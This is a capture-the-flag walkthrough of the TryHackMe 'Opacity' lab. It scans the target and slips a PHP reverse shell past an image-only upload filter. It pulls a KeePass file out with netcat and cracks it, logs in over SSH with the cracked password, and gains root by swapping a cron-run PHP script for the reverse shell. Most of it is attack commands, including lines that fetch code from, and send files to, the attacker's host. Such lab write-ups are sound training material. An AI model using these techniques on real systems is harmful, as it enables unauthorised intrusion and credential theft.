# Opacity

**Room Link:** [https://tryhackme.com/room/opacity](https://tryhackme.com/room/opacity)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>

Found this page, I tried different extensions but it looks like it only accepts extentsions that images uses such as .jpg and .png

<figure><img src="../../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

## Initial Shell

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cp php-reverse-shell/php-reverse-shell.php .
subl php-reverse-shell.php 
```

<figure><img src="../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

**Kali #1**

```
python2 -m SimpleHTTPServer 81
```

**Kali #2**

```
nc -lvnp 1337
```

**Browser**

```
http://$KALI:81/php-reverse-shell.php#.jpg
```

<figure><img src="../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
pytho3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



##

### Transfer file

In /opt we find a keepass file so I transfered back to Kali to try to crack it

<figure><img src="../../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

**Kali(receiving)**

```
nc -l -p 1234 > dataset.kdbx
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < dataset.kdbx
```



### Crack KeePass

**Kali**

```
/opt/john/keepass2john dataset.kdbx > johnkeepass.txt
john --wordlist=/usr/share/wordlists/rockyou.txt johnkeepass.txt 
```

<figure><img src="../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
keepassx dataset.kdbx 
Password: 741852963
```

<figure><img src="../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

### TCP/22 - SSH

**Kali**

```
ssh sysadmin@$VICTIM
Password: Cl0udP4ss40p4city#8700
```

<figure><img src="../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

## PSPY

**Kali**

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 
python2 -m SimpleHTTPServer 81
```

**Victim**

```
wget http://$KALI:81/pspy32 
chmod +x pspy32 
./pspy32
```



<figure><img src="../../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

The script calls backup.inc.php in the lib folder, we can't edit this file but we can delete it and replace it so I copied the same php reverse shell script that was used before and replaced backup. After that I just waited until the script ran on its own.

**Kali #1**

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 
python2 -m SimpleHTTPServer 81
```

**Victim**

```
rm -f backup.inc.php
wget http://10.10.215.36:81/php-reverse-shell.php 
cp php-reverse-shell.php backup.inc.php
```

**Kali #2**

```
nc -lvnp 1337
```

<figure><img src="../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>





































